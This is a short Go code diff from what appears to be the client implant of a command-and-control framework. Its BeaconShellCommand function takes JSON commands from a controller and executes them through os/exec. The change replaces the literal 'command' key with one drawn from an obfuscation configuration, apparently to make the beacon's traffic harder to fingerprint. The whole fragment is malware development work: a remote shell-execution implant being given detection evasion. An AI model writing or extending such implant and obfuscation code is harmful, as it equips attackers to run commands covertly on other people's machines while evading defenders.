@@ -9,6 +9,7 @@ import (
 	"os"
 	"os/exec"
 	"os/user"
+	"src/Client/generic/config"
 	"src/Client/generic/logger"
 	"src/Client/session/protocol"
 	"strings"
@@ -25,7 +26,7 @@ func BeaconShellCommand(command string) (string, error) {
 	if json.Valid([]byte(command)) {
 		if err := json.Unmarshal([]byte(command), &cmdData); err == nil {
 			// Only handle if "command" key exists
-			if val, ok := cmdData["command"]; ok {
+			if val, ok := cmdData[config.Obfuscation.Generic.Commands.Command]; ok {
 				if commandStr, ok = val.(string); !ok || commandStr == "" {
 					logger.Error("Received empty or invalid command data.")
 					return "", fmt.Errorf("error: received empty or invalid command data")
